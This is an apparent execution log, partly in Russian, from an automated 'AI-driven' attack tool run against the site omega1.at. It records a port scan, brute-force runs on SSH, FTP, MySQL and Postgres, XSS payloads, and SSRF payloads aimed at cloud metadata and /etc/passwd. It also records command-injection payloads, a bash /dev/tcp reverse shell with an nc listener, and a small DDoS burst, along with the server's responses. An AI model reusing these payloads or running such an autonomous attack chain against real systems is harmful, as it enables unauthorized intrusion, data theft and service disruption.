2025-11-04 18:45:37,794 - NeuralHunter - INFO - [bold magenta]НЕЙРОННЫЙ ЛОГЕР v10.1 АКТИВИРОВАН[/bold magenta]
2025-11-04 18:45:37,796 - NeuralHunter - INFO - [bold magenta]НЕЙРОННЫЙ ХАНТЕР v14.0 — 21 АТАКА[/bold magenta]
2025-11-04 18:45:37,799 - NeuralHunter - INFO - [bold cyan]ИИ: ИИ: NeuralBrain v14.0[/bold cyan]
2025-11-04 18:45:37,801 - NeuralHunter - INFO - ULTIMATE TOKEN HUNTER → http://omega1.at/FUZZ
2025-11-04 18:45:38,300 - NeuralHunter - INFO - [GET] http://omega1.at/ → 200
2025-11-04 18:45:38,302 - NeuralHunter - INFO - PORT SCAN → http://omega1.at/FUZZ
2025-11-04 18:45:38,310 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 21
2025-11-04 18:45:38,314 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 22
2025-11-04 18:45:38,318 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 80
2025-11-04 18:45:38,323 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 443
2025-11-04 18:45:38,326 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 8080
2025-11-04 18:45:38,330 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 8443
2025-11-04 18:45:38,333 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 3306
2025-11-04 18:45:38,337 - NeuralHunter - INFO - ПОРТ ОТКРЫТ: 5432
2025-11-04 18:45:38,341 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: MYSQL_BRUTEFORCE[/bold cyan]
2025-11-04 18:46:27,946 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: POSTGRES_BRUTEFORCE[/bold cyan]
2025-11-04 18:46:59,445 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: SSH_BRUTEFORCE[/bold cyan]
2025-11-04 18:46:59,447 - NeuralHunter - INFO - SSH BRUTEFORCE → omega1.at:22
2025-11-04 18:47:29,692 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: FTP_BRUTEFORCE[/bold cyan]
2025-11-04 18:48:18,015 - NeuralHunter - INFO - SQL INJECTION → http://omega1.at/FUZZ
2025-11-04 18:48:18,017 - NeuralHunter - ERROR - SQLi ошибка: 'TorClient' object has no attribute 'sync_request'
2025-11-04 18:48:18,018 - NeuralHunter - INFO - XSS АТАКА → http://omega1.at/FUZZ
2025-11-04 18:48:18,020 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Cscript%3Ealert%281%29%3C/script%3E
2025-11-04 18:48:18,475 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Cscript%3Ealert%281%29%3C/script%3E → 403
2025-11-04 18:48:18,479 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
2025-11-04 18:48:18,763 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%27%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E → 200
2025-11-04 18:48:18,765 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=javascript%3Aalert%281%29
2025-11-04 18:48:19,053 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=javascript%3Aalert%281%29 → 200
2025-11-04 18:48:19,054 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Csvg/onload%3Dalert%281%29%3E
2025-11-04 18:48:19,325 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Csvg/onload%3Dalert%281%29%3E → 200
2025-11-04 18:48:19,328 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%22%27%3E%3Cscript%3Ealert%281%29%3C/script%3E
2025-11-04 18:48:19,809 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%22%27%3E%3Cscript%3Ealert%281%29%3C/script%3E → 403
2025-11-04 18:48:19,811 - NeuralHunter - INFO - XSS ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E
2025-11-04 18:48:20,325 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E → 403
2025-11-04 18:48:20,327 - NeuralHunter - INFO - CSRF АТАКА → http://omega1.at/FUZZ
2025-11-04 18:48:20,617 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ → 200
2025-11-04 18:48:20,619 - NeuralHunter - INFO - SSRF АТАКА → http://omega1.at/FUZZ
2025-11-04 18:48:20,620 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=http%3A//169.254.169.254/latest/meta-data/
2025-11-04 18:48:20,930 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=http%3A//169.254.169.254/latest/meta-data/ → 200
2025-11-04 18:48:20,932 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=http%3A//127.0.0.1%3A22
2025-11-04 18:48:21,343 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=http%3A//127.0.0.1%3A22 → 200
2025-11-04 18:48:21,345 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=file%3A///etc/passwd
2025-11-04 18:48:21,807 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=file%3A///etc/passwd → 403
2025-11-04 18:48:21,809 - NeuralHunter - WARNING - SSRF ЗАБЛОКИРОВАН: 403 на file:///etc/passwd
2025-11-04 18:48:21,810 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=file%3A///proc/version
2025-11-04 18:48:22,104 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=file%3A///proc/version → 200
2025-11-04 18:48:22,106 - NeuralHunter - INFO - SSRF ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=gopher%3A//127.0.0.1%3A3306/_%252e%252e
2025-11-04 18:48:22,393 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=gopher%3A//127.0.0.1%3A3306/_%252e%252e → 200
2025-11-04 18:48:22,396 - NeuralHunter - INFO - RCE АТАКА → http://omega1.at/FUZZ
2025-11-04 18:48:22,397 - NeuralHunter - INFO - RCE ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%3Bid
2025-11-04 18:48:22,680 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bid → 200
2025-11-04 18:48:22,682 - NeuralHunter - INFO - RCE ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%7Cwhoami
2025-11-04 18:48:22,977 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%7Cwhoami → 200
2025-11-04 18:48:22,979 - NeuralHunter - INFO - RCE ПЕЙЛОД:
                             http://omega1.at/FUZZ?FUZZ=%24%28id%29
2025-11-04 18:48:23,417 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%24%28id%29 → 403
2025-11-04 18:48:23,420 - NeuralHunter - INFO - RCE НАЙДЕН: $(id)
2025-11-04 18:48:23,424 - NeuralHunter - INFO - [bold cyan]ИИ: АВТО-АТАКА: REVERSE_SHELL[/bold cyan]
2025-11-04 18:48:23,425 - NeuralHunter - INFO - REVERSE SHELL → http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27
2025-11-04 18:48:23,427 - NeuralHunter - INFO - СЛУШАЙ: nc -lvnp 4444
2025-11-04 18:48:23,917 - NeuralHunter - INFO - [GET] http://omega1.at/FUZZ?FUZZ=%3Bbash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/192.168.1.100/4444%200%3E%261%27 → 403
2025-11-04 18:48:23,922 - NeuralHunter - WARNING - SMART DDOS: 200 запросов → http://omega1.at/FUZZ (ТОЛЬКО НА СВОЙ СЕРВЕР!)
2025-11-04 18:49:31,155 - NeuralHunter - CRITICAL - [bold red]БРЕШЬ: УСПЕШНЫХ АТАК: 4/21[/bold red]
2025-11-04 18:49:31,157 - NeuralHunter - CRITICAL - ОШИБКА: 'NeuralBrain' object has no attribute 'save'
